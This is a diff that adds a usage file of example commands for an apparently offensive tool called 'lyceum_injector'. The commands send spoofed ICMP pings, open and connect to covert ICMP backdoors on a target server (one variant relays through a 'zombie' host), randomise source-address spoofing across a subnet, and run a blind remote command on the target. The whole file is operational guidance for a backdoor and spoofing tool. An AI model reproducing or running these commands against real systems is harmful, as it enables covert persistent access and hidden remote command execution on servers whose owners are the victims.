@@ -1,0 +1,29 @@
+# Client commands: this is by no means a comprehensive list just some examples
+#
+# Server IP Address: 	1.1.1.1
+# Local IP Address:	2.2.2.2   (NB. this is not the source IP address that is random by default)
+# Zombie host Address:	3.3.3.3
+
+#---------------------Pinging server---------------------
+ ./lyceum_injector -d 1.1.1.1 -l 2.2.2.2 -u 1			# Send bi-spoofed ping to 1.1.1.1 from 2.2.2.2
+#--------------------------------------------------------
+
+#-----Opening and connecting to bi-spoofed backdoor------
+ ./lyceum_injector -d 1.1.1.1 -l 2.2.2.2 -u 4			# Open bi-spoofed icmp backdoor on 1.1.1.1 from 2.2.2.2
+ ./lyceum_injector -d 1.1.1.1 -l 2.2.2.2 -i 0			# Connect to bi-spoofed backdoor using default icmp type
+#--------------------------------------------------------
+
+#-----Opening and connecting to moonbounce backdoor------
+ ./lyceum_injector -d 1.1.1.1 -l 2.2.2.2 -u 3			# Open icmp bounce backdoor on 1.1.1.1 from 2.2.2.2
+ ./lyceum_injector -d 1.1.1.1 -l 2.2.2.2 -b 3.3.3.3		# Connect to bounce backdoor through zombie 3.3.3.3
+#--------------------------------------------------------
+
+#-------------------Set subnet spoofing------------------
+ ./lyceum_injector -d 1.1.1.1 -l 2.2.2.2 -u 6:4.4.4		# Set server spoofing to randomise between 4.4.4.0-255
+ ./lyceum_injector -d 1.1.1.1 -l 2.2.2.2 -S 4.4.4 -u 6:4.4.4	# Set server & client spoofing to randomise between
+								# 4.4.4.0-255
+#--------------------------------------------------------
+
+#-----------------Execute remote command-----------------
+ ./lyceum_injector -d 1.1.1.1 -l 2.2.2.2 -u 5:"touch /etc/foobar"  # Execute a blind command on 1.1.1.1
+#--------------------------------------------------------
